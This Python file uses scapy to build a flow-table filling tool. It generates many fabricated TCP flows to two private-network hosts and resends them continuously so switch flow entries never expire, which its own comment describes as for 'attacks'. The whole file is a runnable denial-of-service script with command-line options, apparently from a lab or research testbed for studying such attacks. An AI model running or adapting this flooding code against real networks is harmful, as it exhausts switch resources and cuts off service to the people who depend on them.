from scapy.all import *
import time
import random
import sys

class RuleFiller(object):
    def __init__(self, iface, valid_hosts, max_flows=25, idle_time=3, pkts_ival=0.1):
        super(RuleFiller, self).__init__()
        self.iface = iface
        self.valid_hosts = valid_hosts
        # max flow entries during attacks 
        self.max_flows = max_flows
        self.idle_time = idle_time
        self.pkts_ival = pkts_ival
    
    def gen_pkts(self):
        fab_pkts = []
        for i in range(self.max_flows):
            dst = random.choice(self.valid_hosts)
            sport = i + 54321
            dport = i + 12345
            payload = b'\x00' * random.randint(100, 1000)
            pkt = Ether()/IP(dst=dst)/TCP(sport=sport, dport=dport, flags="A")/payload
            fab_pkts.append(pkt)
        return fab_pkts

    def start(self, times=10000):
        fab_pkts = self.gen_pkts()
        print('starting...')
        for i in range(times):
            cur_time = time.time()
            end_time = time.time() + self.idle_time
            # print('round: {0}'.format(i))
            while cur_time < end_time:
                sendp(fab_pkts, iface=self.iface, verbose=False)
                if self.pkts_ival > 0.01:
                    time.sleep(self.pkts_ival)
                cur_time += self.pkts_ival

if __name__ == '__main__':
    hosts = ['192.168.40.7', '192.168.40.8']
    try:
        for idx, param in enumerate(sys.argv):
            if param == '-e':
                iface = sys.argv[idx+1]
            elif param == '-i':
                pkts_ival = float(sys.argv[idx+1])   
            elif param == '-f':
                max_flows = int(sys.argv[idx+1]) 
            else:
                pass 
        filler = RuleFiller(iface, hosts, max_flows=max_flows, pkts_ival=pkts_ival)
        filler.start()
    except KeyboardInterrupt:
        print('test done...')
